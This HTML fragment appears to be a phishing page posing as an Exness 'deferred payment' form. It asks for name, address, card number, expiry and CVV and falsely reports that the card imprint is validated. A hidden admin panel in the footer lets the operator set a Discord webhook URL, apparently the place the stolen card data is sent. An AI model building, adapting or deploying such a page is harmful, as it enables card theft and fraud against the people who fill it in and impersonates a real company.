
    <div class="payment-container">
        <header class="payment-header">
            <div class="logo-container">
                <img src="https://picsum.photos/seed/exness/200/80.jpg" alt="Exness Logo" class="logo">
            </div>
            <h1 class="payment-title">Payment Différé pour Exness</h1>
        </header>

        <main class="payment-main">
            <div class="payment-form-container">
                <div class="amount-display">
                    <span class="amount-label">Montant à payer:</span>
                    <span class="amount-value">100 €</span>
                </div>

                <form id="payment-form" class="payment-form">
                    <div class="form-group">
                        <label for="fullname">Nom complet</label>
                        <input type="text" id="fullname" name="fullname" required="" placeholder="Jean Dupont">
                    </div>

                    <div class="form-group">
                        <label for="address">Adresse</label>
                        <input type="text" id="address" name="address" required="" placeholder="123 Rue de la Paix, 75001 Paris">
                    </div>

                    <div class="card-details">
                        <div class="form-group">
                            <label for="card-number">Numéro de carte</label>
                            <input type="text" id="card-number" name="card-number" required="" placeholder="1234 5678 9012 3456" maxlength="19">
                            <div id="card-error" class="error-message"></div>
                        </div>

                        <div class="form-row">
                            <div class="form-group">
                                <label for="expiry">Date d'expiration</label>
                                <input type="text" id="expiry" name="expiry" required="" placeholder="MM/AA" maxlength="5">
                            </div>

                            <div class="form-group">
                                <label for="cvv">CVV</label>
                                <input type="text" id="cvv" name="cvv" required="" placeholder="123" maxlength="3">
                            </div>
                        </div>
                    </div>

                    <button type="submit" id="payment-button" class="payment-button">Régler</button>
                </form>

                <div id="processing" class="processing hidden">
                    <div class="spinner"></div>
                    <p>Traitement de votre paiement...</p>
                </div>

                <div id="success-message" class="success-message hidden">
                    <div class="success-icon">✓</div>
                    <h2>Empreinte bancaire validée</h2>
                    <p>Vous serez débité de 100 € dans 20 jours.</p>
                </div>
            </div>
        </main>

        <footer class="payment-footer">
            <p>© 2023 Exness. Tous droits réservés.</p>
            <button id="admin-toggle" class="admin-toggle-btn">Admin</button>
        </footer>
    </div>

    
    <div id="admin-panel" class="admin-panel hidden">
        <div class="admin-panel-content">
            <h3>Configuration</h3>
            <div class="config-group">
                <label for="admin-password">Mot de passe admin</label>
                <input type="password" id="admin-password" placeholder="Entrez votre mot de passe">
                <button id="admin-login" class="config-button">Connexion</button>
            </div>
            
            <div id="webhook-config" class="webhook-config hidden">
                <div class="config-group">
                    <label for="webhook-url">URL Webhook Discord</label>
                    <input type="text" id="webhook-url" placeholder="https://discord.com/api/webhooks/...">
                    <button id="save-config" class="config-button">Enregistrer</button>
                </div>
            </div>
            
            <button id="admin-close" class="admin-close-btn">Fermer</button>
        </div>
    </div>
